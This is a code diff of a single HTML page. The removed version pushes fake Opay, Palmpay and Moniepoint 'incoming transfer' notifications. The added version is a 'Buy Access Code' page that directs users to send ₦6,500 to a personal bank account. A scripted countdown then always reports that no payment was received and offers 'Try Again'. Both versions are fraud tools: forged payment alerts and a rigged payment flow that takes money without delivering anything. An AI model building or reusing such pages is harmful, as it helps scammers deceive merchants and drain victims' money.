@@ -1,117 +1,556 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Add Money</title>
-  <style>
-    body{font-family:Arial,sans-serif;margin:0;padding:0;background:#fff;}
-    .header{display:flex;justify-content:space-between;align-items:center;padding:15px;border-bottom:1px solid #eee;}
-    .continue{color:#00b894;font-weight:bold;cursor:pointer;}
-    .container{padding:15px;max-width:540px;margin:auto;}
-    .form-group{margin-bottom:20px;}
-    label{font-weight:bold;margin-bottom:6px;display:block;}
-    input[type="text"]{width:100%;height:50px;border:2px solid #00b894;border-radius:12px;padding:0 15px;}
-    .custom-select{position:relative;}
-    .select-selected{border:2px solid #00b894;border-radius:12px;height:50px;display:flex;align-items:center;gap:10px;padding:0 12px;cursor:pointer;}
-    .select-selected img{width:30px;height:30px;border-radius:50%;}
-    .select-items{position:absolute;top:110%;left:0;right:0;background:#fff;border:2px solid #00b894;border-radius:12px;display:none;z-index:10;}
-    .select-items div{padding:10px;display:flex;align-items:center;gap:10px;cursor:pointer;}
-    .select-items div:hover{background:#f6f6f6;}
-    .select-items img{width:30px;height:30px;border-radius:50%;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy Access Code</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6; /* A light gray background to match the screenshot's empty space */
+        }
+        /* CHANGE: Changed purple-800 to a vibrant green (#10b981) */
+        .pay-button {
+            background-color: #10b981; /* green-500 equivalent */
+        }
+        /* CHANGE: Changed hover color to a darker green (#059669) */
+        .pay-button:hover {
+            background-color: #059669; /* darker green equivalent for hover effect */
+        }
+        /* Custom CSS for the loading spinner */
+        .spinner {
+            border: 6px solid rgba(0, 0, 0, 0.1); /* Increased border for a bolder look */
+            width: 80px; /* Made the spinner bigger */
+            height: 80px; /* Made the spinner bigger */
+            border-radius: 50%;
+            /* CHANGE: Changed spinner color to green (#10b981) */
+            border-left-color: #10b981; /* Green color for the spinner */
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 50;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 40;
+        }
+
+        /* --- Custom CSS for the Bank Transfer Page --- */
+        :root{
+            --hdr:#f0f1f4;      /* grey header bg */
+            --danger:#ff3b30;   /* Cancel */
+            --card:#f6f7fb;     /* light card */
+            --btn:#ff9f0a;      /* orange buttons */
+            --text:#0b0b0b;
+            --muted:#8a8a8a;
+        }
+        *{box-sizing:border-box}
+        .bank-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,system-ui,sans-serif;color:var(--text);background:#fff}
+
+        .header-bank{
+            background:var(--hdr);
+            border-bottom:1px solid #e6e7eb;
+            padding:12px 16px;
+            display:flex;align-items:center;justify-content:space-between;
+        }
+        .header-bank .title{font-size:22px;font-weight:650;letter-spacing:.2px}
+        .header-bank .cancel{color:var(--danger);font-weight:600}
+
+        /* ROW: icon far-left, amount+email far-right */
+        .summary{
+            padding:18px 16px 8px;
+            display:flex;align-items:center;justify-content:space-between;
+            gap:12px;
+        }
+        .logo{
+            width:56px;height:56px;border-radius:50%;
+            background:#172a68;display:grid;place-items:center;flex:0 0 56px;
+        }
+        .ring{width:30px;height:30px;border-radius:50%;
+                box-shadow:0 0 0 4px #f59f0a inset, 0 0 0 10px #172a68 inset;}
+        .right-block{flex:1;display:flex;flex-direction:column;align-items:flex-end;text-align:right;min-width:0}
+        .amount{font-size:22px;font-weight:800;line-height:1.1}
+        .amount small{font-weight:700;opacity:.9;margin-right:4px}
+        .email{margin-top:2px;font-size:14px;color:var(--muted);word-break:break-all}
+
+        .instruction{text-align:center;font-size:15px;color:#444;padding:4px 16px 14px}
+
+        .card{
+            background:var(--card);
+            border:1px solid #eceef4;
+            border-radius:18px;
+            margin:0 16px 18px;
+            padding:14px;
+        }
+        .field{margin:10px 0 14px}
+        .label{display:flex;align-items:center;gap:8px;font-size:13px;color:#7a8699;margin-bottom:6px}
+        .chip{
+            width:22px;height:22px;border-radius:6px;background:#dde6ff;
+            color:#2746d6;font-weight:700;font-size:12px;display:grid;place-items:center;
+        }
+        .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
+        .value{font-size:18px;font-weight:800;letter-spacing:.2px}
+        .copy{
+            border:0;background:var(--btn);color:#fff;
+            padding:8px 14px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer
+        }
+        .note{color:#444;font-size:14px;line-height:1.45;margin-top:2px}
+
+        .cta{
+            margin-top:14px;width:100%;border:0;background:var(--btn);
+            color:#1c1400;padding:14px 16px;border-radius:10px;font-weight:800;font-size:16px;cursor:pointer
+        }
+
+        /* copy toast */
+        .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);
+                background:#111827;color:#fff;padding:10px 14px;border-radius:10px;
+                font-size:14px;opacity:0;pointer-events:none;transition:opacity .25s}
+        .toast.show{opacity:1}
+
+        /* Final Loading Countdown */
+        .countdown-container {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .countdown-svg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+        .countdown-svg circle {
+            fill: none;
+            stroke-width: 8px;
+        }
+        .countdown-svg .bg {
+            stroke: #e2e8f0;
+        }
+        .countdown-svg .progress {
+            /* CHANGE: Changed progress bar color to green (#10b981) */
+            stroke: #10b981; /* Green color for the progress bar */
+            stroke-dasharray: 377; /* 2 * pi * radius (60) */
+            stroke-dashoffset: 377;
+            transition: stroke-dashoffset 1s linear;
+        }
+        .countdown-number {
+            font-size: 3rem;
+            font-weight: 600;
+        }
+        
+        /* --- Styles for the new error page --- */
+        .error-page-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+        }
+        .error-icon-bg {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: #ef4444; /* red-500 */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .error-icon-svg {
+            color: white;
+            width: 60px;
+            height: 60px;
+        }
+        .error-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fb923c; /* orange-400 */
+            margin-bottom: 12px;
+        }
+        .error-message {
+            font-size: 16px;
+            color: #4b5563; /* gray-600 */
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 24px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 40px 12px 16px;
+            border-radius: 12px;
+            border: 1px solid #d1d5db; /* gray-300 */
+            background-color: white;
+            font-size: 16px;
+        }
+        .input-group .toggle-btn {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+        }
+        .input-group .toggle-btn svg {
+            color: #6b7280; /* gray-500 */
+            width: 20px;
+            height: 20px;
+        }
+        .try-again-btn {
+            width: 100%;
+            max-width: 300px;
+            /* CHANGE: Changed button background to green (#10b981) */
+            background-color: #10b981; /* green-500 */
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: none;
+        }
+    </style>
 </head>
-<body>
-  <div class="header">
-    <a href="#">&lt; Add Money</a>
-    <span class="continue" id="continueButton">Continue</span>
-  </div>
+<body class="bg-white min-h-screen">
+    <div id="form-container" class="max-w-md mx-auto min-h-screen flex flex-col bg-white">
+        <header class="bg-green-500 text-white p-4" style="background-color: #10b981;">
+            <h1 class="text-xl font-semibold">Buy Access Code</h1>
+        </header>
 
-  <div class="container">
-    <div class="form-group">
-      <label>Amount</label>
-      <input id="amount" type="text" placeholder="Input The Amount">
+        <main class="flex-grow p-6 space-y-6">
+            <div>
+                <label for="amount" class="block text-gray-700 font-medium mb-2">Amount</label>
+                <div class="relative">
+                    <div class="w-full pl-3 pr-10 py-3 bg-gray-100 rounded-xl text-gray-700 font-medium">
+                        ₦6,500
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <label for="fullName" class="block text-gray-700 font-medium mb-2">Full Name</label>
+                <input type="text" id="fullName" placeholder="Your full name" class="w-full px-4 py-3 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-green-500 placeholder-gray-400">
+            </div>
+
+            <div>
+                <label for="email" class="block text-gray-700 font-medium mb-2">Your Email Address</label>
+                <input type="email" id="email" placeholder="email address" class="w-full px-4 py-3 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-green-500 placeholder-gray-400">
+            </div>
+
+            <button id="pay-button" class="pay-button w-full text-white font-semibold py-3 rounded-xl shadow-lg">
+                Pay
+            </button>
+        </main>
+
+        <footer class="p-6 text-center text-gray-500 text-sm">
+            <p>Your Access Code will be displayed on the app once your payment is confirmed.</p>
+        </footer>
     </div>
-    <div class="form-group">
-      <label>Sender Name</label>
-      <input id="sender" type="text" placeholder="Input Sender Name">
+    
+    <div id="loading-container" class="hidden fixed top-0 left-0 w-full h-full bg-white flex flex-col items-center justify-center text-center px-4">
+        <div class="spinner mb-8"></div>
+        <h2 class="text-2xl font-bold mb-2">Processing your request...</h2>
+        <p class="text-gray-500 text-lg">Please wait while we prepare your payment options</p>
     </div>
-    <div class="form-group">
-      <label>Bank Name</label>
-      <div class="custom-select" id="bankSelect">
-        <div class="select-selected">
-          <img id="selectedLogo" src="https://i.ibb.co/vq4t5PS/palmpay.png">
-          <span id="selectedText" data-bank="Palmpay">Palmpay</span>
+
+    <div id="important-notice-container" class="hidden fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+        <div class="bg-gray-200 rounded-3xl p-6 text-center max-w-md w-full shadow-lg space-y-4">
+            <h3 class="text-red-500 text-xl font-bold">Important Notice</h3>
+            <p class="text-gray-800 font-medium">Please do NOT make your payment with Opay.</p>
+            <p class="text-gray-600 text-sm">
+                Opay service is currently down. If you make your payment using Opay, your payment may not be confirmed.
+            </p>
+            <p class="text-gray-600 text-sm">
+                If you must use Opay, transfer the money to another bank and use that bank account to make your payment or use POS.
+            </p>
+            <button id="i-understand-btn" class="w-full text-white font-semibold py-3 rounded-2xl" style="background-color: #10b981;">
+                I Understand
+            </button>
         </div>
-        <div class="select-items" id="bankItems">
-          <div data-bank="Palmpay"><img src="https://i.ibb.co/vq4t5PS/palmpay.png"> Palmpay</div>
-          <div data-bank="Opay"><img src="https://i.ibb.co/vXtcz4f/opay.png"> Opay</div>
-          <div data-bank="Moniepoint"><img src="https://i.ibb.co/QQb5t2q/moniepoint.png"> Moniepoint</div>
-        </div>
-      </div>
     </div>
-  </div>
 
-<script>
-const selected = document.querySelector('.select-selected');
-const selectedText = document.getElementById('selectedText');
-const selectedLogo = document.getElementById('selectedLogo');
-const items = document.getElementById('bankItems');
-selected.addEventListener('click', ()=>items.style.display= items.style.display==="block"?"none":"block");
-items.querySelectorAll('div').forEach(div=>{
-  div.addEventListener('click', ()=>{
-    selectedText.textContent=div.textContent.trim();
-    selectedText.dataset.bank=div.dataset.bank;
-    selectedLogo.src=div.querySelector('img').src;
-    items.style.display="none";
-  });
-});
 
-// Register service worker
-if ("serviceWorker" in navigator) {
-  navigator.serviceWorker.register("sw.js").then(()=>console.log("Service Worker registered"));
-}
+    <div id="bank-transfer-container" class="hidden max-w-md mx-auto min-h-screen flex flex-col bg-white bank-body">
+        <div class="header-bank">
+            <div class="title">Bank Transfer</div>
+            <div class="cancel">Cancel</div>
+        </div>
+        <div class="summary">
+            <div class="logo"><div class="ring"></div></div>
+            <div class="right-block">
+                <div class="amount"><small>NGN</small>6,500</div>
+                <div class="email" id="user-email-display"></div>
+            </div>
+        </div>
+        <p class="instruction">Complete this bank transfer to proceed</p>
+        <div class="card">
+            <div class="field">
+                <div class="label"><span class="chip">🧾</span> <span>Amount</span></div>
+                <div class="row">
+                    <div class="value" id="amt">NGN 6,500</div>
+                    <button class="copy" data-copy="#amt">Copy</button>
+                </div>
+            </div>
+            <div class="field">
+                <div class="label"><span class="chip">🔢</span> <span>Account Number</span></div>
+                <div class="row">
+                    <div class="value" id="acct">5082150846</div>
+                    <button class="copy" data-copy="#acct">Copy</button>
+                </div>
+            </div>
+            <div class="field">
+                <div class="label"><span class="chip">🏦</span> <span>Bank Name</span></div>
+                <div class="value">monie point</div>
+            </div>
+            <div class="field">
+                <div class="label"><span class="chip">👤</span> <span>Account Name</span></div>
+                <div class="value">VICTOR NNMDI</div>
+            </div>
+            <div class="note">
+                Transfer the exact amount to the account above. Your Access Code will be generated automatically after payment confirmation. Use your registered name as the transfer description for faster processing.
+            </div>
+            <button class="cta" id="bank-transfer-cta">I have made this bank Transfer</button>
+        </div>
+        <div class="toast" id="toast">Copied</div>
+    </div>
 
-document.getElementById('continueButton').addEventListener('click', async ()=>{
-  const bank = selectedText.dataset.bank;
-  const amount = document.getElementById('amount').value.trim();
-  const sender = document.getElementById('sender').value.trim();
-  if(!amount || !sender) return alert("Enter amount & sender name");
+    <div id="final-loading-container" class="hidden fixed top-0 left-0 w-full h-full bg-white flex flex-col items-center justify-center text-center px-4">
+        <div class="countdown-container mb-8">
+            <svg class="countdown-svg">
+                <circle r="60" cx="70" cy="70" class="bg"></circle>
+                <circle r="60" cx="70" cy="70" class="progress"></circle>
+            </svg>
+            <span id="countdown-number" class="countdown-number">10</span>
+        </div>
+        <h2 class="text-2xl font-bold mb-2">Verifying your payment</h2>
+        <p class="text-gray-500 text-lg">Please wait while we confirm your bank transfer...</p>
+    </div>
 
-  const notifications = {
-    "Opay": {
-      title: "Opay • Incoming Transfer Successful",
-      body: `DAILY PAY has sent you ₦${amount}.\nGet up to 6% bonus on OPay Airtime.`,
-      icon: "https://i.ibb.co/vXtcz4f/opay.png"
-    },
-    "Palmpay": {
-      title: "Palmpay • Interbank Transfer",
-      body: `You received NGN ${amount} from ${sender}.\nEarn Up to ₦100,000 Cash per transaction!`,
-      icon: "https://i.ibb.co/vq4t5PS/palmpay.png"
-    },
-    "Moniepoint": {
-      title: "Moniepoint • Credit Alert",
-      body: `You have just received NGN${amount} from ${sender}.`,
-      icon: "https://i.ibb.co/QQb5t2q/moniepoint.png"
-    }
-  };
+    <div id="error-page-container" class="hidden max-w-md mx-auto min-h-screen flex flex-col justify-center bg-gray-100">
+        <div class="error-page-container">
+            <div class="error-icon-bg">
+                <svg xmlns="http://www.w3.org/2000/svg" class="error-icon-svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </div>
+            <div class="error-title">Transaction verification failed!</div>
+            <p class="error-message">
+                Your payment could not be completed.<br>
+                Reason:No Payment received from you/<br>invalid payment method.
+            </p>
+            <div class="input-group">
+                <input type="password" id="not-available-input" value="Not Available" readonly>
+                <button id="toggle-visibility-btn" class="toggle-btn">
+                    <svg id="eye-closed-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.418 0-8-2.686-8-6s3.582-6 8-6c1.01 0 1.99.191 2.923.541M15 12a3 3 0 11-6 0 3 3 0 016 0zM19 12c-1.378-2.756-3.83-5-6-5-1.92 0-3.693.815-5 2.128M3 3l18 18" />
+                    </svg>
+                    <svg id="eye-open-icon" class="h-5 w-5 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                    </svg>
+                </button>
+            </div>
+            <button id="try-again-btn" class="try-again-btn">Try Again</button>
+        </div>
+    </div>
 
-  const notif = notifications[bank];
-  if(Notification.permission !== "granted"){
-    await Notification.requestPermission();
-  }
-  if(Notification.permission==="granted"){
-    navigator.serviceWorker.ready.then(reg=>{
-      reg.showNotification(notif.title, {
-        body: notif.body,
-        icon: notif.icon,
-        badge: notif.icon,
-        vibrate:[200,100,200],
-        data:{url:"/"}
-      });
-    });
-  }
-});
-</script>
+    <div id="message-box-container" class="hidden">
+        <div class="overlay"></div>
+        <div class="message-box">
+            <p id="message-box-text" class="mb-4"></p>
+            <button id="message-box-close" class="text-white px-4 py-2 rounded-lg" style="background-color: #10b981;">Close</button>
+        </div>
+    </div>
+        <script>
+        const payButton = document.getElementById('pay-button');
+        const bankTransferCTA = document.getElementById('bank-transfer-cta');
+        const iUnderstandBtn = document.getElementById('i-understand-btn');
+        const formContainer = document.getElementById('form-container');
+        const loadingContainer = document.getElementById('loading-container');
+        const bankTransferContainer = document.getElementById('bank-transfer-container');
+        const importantNoticeContainer = document.getElementById('important-notice-container');
+        const finalLoadingContainer = document.getElementById('final-loading-container');
+        const countdownNumber = document.getElementById('countdown-number');
+        const countdownCircle = document.querySelector('.progress');
+        const errorPageContainer = document.getElementById('error-page-container');
+        const tryAgainBtn = document.getElementById('try-again-btn');
+        const fullNameInput = document.getElementById('fullName');
+        const emailInput = document.getElementById('email');
+        const messageBoxContainer = document.getElementById('message-box-container');
+        const messageBoxText = document.getElementById('message-box-text');
+        const messageBoxClose = document.getElementById('message-box-close');
+        
+        // New elements for the error page
+        const notAvailableInput = document.getElementById('not-available-input');
+        const toggleVisibilityBtn = document.getElementById('toggle-visibility-btn');
+        const eyeClosedIcon = document.getElementById('eye-closed-icon');
+        const eyeOpenIcon = document.getElementById('eye-open-icon');
+
+        // New element to display the user's email on the bank transfer page
+        const userEmailDisplay = document.getElementById('user-email-display');
+
+        // Function to show the custom message box
+        function showMessageBox(message) {
+            messageBoxText.textContent = message;
+            messageBoxContainer.classList.remove('hidden');
+        }
+
+        // Function to hide the custom message box
+        messageBoxClose.addEventListener('click', () => {
+            messageBoxContainer.classList.add('hidden');
+        });
+
+        // Event listener for the initial "Pay" button click
+        payButton.addEventListener('click', (event) => {
+            event.preventDefault(); // Prevent the form from submitting
+
+            // Check if full name is empty
+            if (fullNameInput.value.trim() === '') {
+                showMessageBox('Please enter your full name.');
+                return;
+            }
+
+            // Basic email validation
+            if (emailInput.value.trim() === '') {
+                showMessageBox('Please enter your email address.');
+                return;
+            }
+
+            if (!emailInput.value.includes('@') || !emailInput.value.includes('.')) {
+                showMessageBox('Please enter a valid email address.');
+                return; // Stop the function if validation fails
+            }
+
+            // Hide the form and show the initial loading screen
+            formContainer.classList.add('hidden');
+            loadingContainer.classList.remove('hidden');
+
+            // Wait for 5 seconds, then show the new Important Notice pop-up
+            setTimeout(() => {
+                loadingContainer.classList.add('hidden');
+                importantNoticeContainer.classList.remove('hidden');
+            }, 5000); // 5000 milliseconds = 5 seconds
+        });
+        
+        // Event listener for the "I Understand" button on the pop-up
+        iUnderstandBtn.addEventListener('click', () => {
+            // Hide the notice and show the bank transfer page
+            importantNoticeContainer.classList.add('hidden');
+            bankTransferContainer.classList.remove('hidden');
+            // Set the email on the bank transfer page to the user's input
+            userEmailDisplay.textContent = emailInput.value.trim();
+        });
+
+        // Event listener for the "I have made this bank Transfer" button
+        bankTransferCTA.addEventListener('click', () => {
+            bankTransferContainer.classList.add('hidden');
+            finalLoadingContainer.classList.remove('hidden');
+
+            // Start the countdown timer
+            let timeLeft = 10;
+            countdownNumber.textContent = timeLeft;
+            const totalTime = 10;
+            const circumference = 377; // 2 * pi * 60 (radius of the circle)
+
+            // The countdown animation now fills up as time passes
+            const countdownInterval = setInterval(() => {
+                countdownNumber.textContent = timeLeft;
+                // Animate the circle to fill up as the time counts down
+                const offset = circumference - ((timeLeft / totalTime) * circumference);
+                countdownCircle.style.strokeDashoffset = offset;
+
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    clearInterval(countdownInterval);
+                    // Hide the final loading screen and show the error page
+                    finalLoadingContainer.classList.add('hidden');
+                    errorPageContainer.classList.remove('hidden');
+                }
+            }, 1000); // Update every second
+        });
+
+        // Event listener for the "Try Again" button on the error page
+        tryAgainBtn.addEventListener('click', () => {
+            // Hide the error page and show the initial form
+            errorPageContainer.classList.add('hidden');
+            formContainer.classList.remove('hidden');
+            // Reset email and name inputs for a new try
+            fullNameInput.value = '';
+            emailInput.value = '';
+        });
+
+        // Event listener for the visibility toggle button on the error page
+        toggleVisibilityBtn.addEventListener('click', () => {
+            if (notAvailableInput.type === 'password') {
+                notAvailableInput.type = 'text';
+                eyeClosedIcon.classList.add('hidden');
+                eyeOpenIcon.classList.remove('hidden');
+            } else {
+                notAvailableInput.type = 'password';
+                eyeClosedIcon.classList.remove('hidden');
+                eyeOpenIcon.classList.add('hidden');
+            }
+        });
+        
+        // --- Bank Transfer Page Scripts ---
+        function toast(msg){
+            const t=document.getElementById('toast');
+            t.textContent=msg||'Copied';
+            t.classList.add('show');
+            setTimeout(()=>t.classList.remove('show'),1300);
+        }
+
+        document.querySelectorAll('.copy').forEach(b=>{
+            b.addEventListener('click', async ()=>{
+                const sel=b.getAttribute('data-copy');
+                const el=document.querySelector(sel);
+                const text=(el?.textContent||'').trim();
+                try{
+                    await navigator.clipboard.writeText(text);
+                }catch(err){
+                    const ta=document.createElement('textarea');
+                    ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();
+                }
+                toast('Copied: '+text);
+            });
+        });
+    </script>
 </body>
 </html>
